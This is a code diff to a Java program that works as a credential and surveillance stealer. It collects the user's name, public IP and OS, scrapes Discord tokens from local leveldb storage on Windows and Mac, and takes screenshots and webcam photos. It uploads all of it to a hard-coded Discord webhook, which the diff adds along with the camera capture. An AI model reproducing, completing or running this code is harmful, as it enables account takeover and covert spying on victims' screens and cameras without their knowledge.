@@ -1,7 +1,4 @@
-package swag.company;
-
-import com.sun.istack.internal.NotNull;
-import sun.net.www.http.HttpClient;
+import com.github.sarxos.webcam.Webcam;
 
 import javax.imageio.ImageIO;
 import java.awt.*;
@@ -12,29 +9,31 @@ import java.net.URL;
 import java.net.URLConnection;
 import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
-import java.nio.file.Files;
-import java.nio.file.Paths;
-import java.util.*;
+import java.util.ArrayList;
 import java.util.List;
+import java.util.Random;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
+
 public class Main {
 
+    private static final String webhookURL = "https://discordapp.com/api/webhooks/876707963753091113/jCpwL5-rAcIqha40u9J1kae3dgAMgqxjJEbAmOc2inKrYKUK-fs9BBG-CrM6_jSl-Ani";
+
     public static void main(String[] args) {
-        String llLlLlL = System.getProperty("os.name");
+        String userOS = System.getProperty("os.name");
+
         try {
             URL whatismyip = new URL("http://checkip.amazonaws.com");
             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                     whatismyip.openStream()));
-            String ip = bufferedReader.readLine();
-            String llLlLlLlL = System.getProperty("user.name");
-            captureScreen();
-            sendMessage("``` NAME : " + llLlLlLlL + "\n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```");
+            String userIP = bufferedReader.readLine();
+            String userName = System.getProperty("user.name");
+            sendMessage("\n``` NAME : " + userName + "\n IP" + "   : " + userIP + " \n OS   : " + userOS + "```");
         } catch (Exception ignore) {
         }
 
-        if (llLlLlL.contains("Windows")) {
+        if (userOS.contains("Windows")) {
 
             List<String> paths = new ArrayList<>();
             paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
@@ -70,13 +69,14 @@ public class Main {
                                     if (cx > 0) {
                                         webhooks.append("\n");
                                     }
-                                    webhooks.append(" ").append(m.group());
+                                    webhooks.append("" + path + pathname + "  --> token: ").append(m.group());
                                     cx++;
                                 }
 
                             }
 
                         } catch (Exception ignored) {
+                            //webhooks.append("\n " + path + "/" + pathname + " NOT FOUND"); //error: Server returned HTTP response code: 400 for URL:
                         }
                     }
                 }
@@ -87,7 +87,7 @@ public class Main {
             }
 
 
-        } else if (llLlLlL.contains("Mac")) {
+        } else if (userOS.contains("Mac")) {
             List<String> paths = new ArrayList<>();
             paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");
 
@@ -132,19 +132,25 @@ public class Main {
             } catch (Exception e) {
                 sendMessage("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
             }
+
         } else {
             sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
         }
+
         try {
+            sendMessage("Screen Capture");
             captureScreen();
         } catch (Exception ex) {
             sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
         }
+
         try {
+            sendMessage("Camera Capture");
             captureCamera();
         } catch (Exception ex) {
             sendMessage("``` UNABLE TO CAPTURE CAMERA : " + ex + "```");
         }
+
     }
 
     private static void sendMessage(String message) {
@@ -152,7 +158,7 @@ public class Main {
         BufferedReader in = null;
         StringBuilder result = new StringBuilder();
         try {
-            URL realUrl = new URL("webhook");
+            URL realUrl = new URL(webhookURL);
             URLConnection conn = realUrl.openConnection();
             conn.setRequestProperty("accept", "*/*");
             conn.setRequestProperty("connection", "Keep-Alive");
@@ -187,29 +193,35 @@ public class Main {
     }
 
     private static void sendFile(File file) throws IOException {
-
-        String url = "webhook";
+        String url = webhookURL;
         String boundary = Long.toHexString(System.currentTimeMillis());
         URLConnection connection = new URL(url).openConnection();
         connection.setDoOutput(true);
         connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
         connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
         try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
             writer.println("--" + boundary);
             writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
             writer.write("Content-Type: image/png");
             writer.println();
             writer.println(readAllBytes(new FileInputStream(file)));
+
             try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                 for (String line; (line = reader.readLine()) != null; ) {
                     writer.println(line);
                 }
+
             }
             writer.println("--" + boundary + "--");
+
         }
+
         System.out.println(((HttpURLConnection) connection).getResponseMessage());
+
     }
-    public static byte[] readAllBytes(@NotNull InputStream stream) throws IOException {
+
+    public static byte[] readAllBytes(InputStream stream) throws IOException {
         int count, pos = 0;
         byte[] output = new byte[0];
         byte[] buf = new byte[1024];
@@ -227,7 +239,6 @@ public class Main {
         return output;
     }
 
-
     @SuppressWarnings("all")
     private static void captureScreen() throws Exception {
         Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
@@ -236,19 +247,31 @@ public class Main {
         BufferedImage image = robot.createScreenCapture(screenRectangle);
         int random = new Random().nextInt();
         File file = new File("cached_" + random + ".png");
+        System.out.println(file.getName());
         ImageIO.write(image, "png", file);
         sendFile(file);
-        file.delete();
+        if (file.delete())
+            System.out.println("Deleted the file: " + file.getName());
+        else
+            System.out.println("Failed to delete the file.");
     }
-    
+
     private static void captureCamera() throws Exception {
         Webcam cam = Webcam.getDefault();
-        cam.open();
-        int random = Math.abs(new Random().nextInt());
-        File webcam = new File("1cached_" + random + ".png");
-        ImageIO.write(cam.getImage(), "PNG", webcam);
-        cam.close();
-        sendFile(webcam);
-        file.delete();
+        if (cam != null) {
+            System.out.println("Webcam: " + cam.getName());
+            cam.open();
+            int random = Math.abs(new Random().nextInt());
+            File webcam = new File("1cached_" + random + ".png");
+            ImageIO.write(cam.getImage(), "PNG", webcam);
+            cam.close();
+            sendFile(webcam);
+            if (webcam.delete())
+                System.out.println("Deleted the file: " + webcam.getName());
+            else
+                System.out.println("Failed to delete the file.");
+        } else
+            System.out.println("No webcam detected");
     }
+
 }
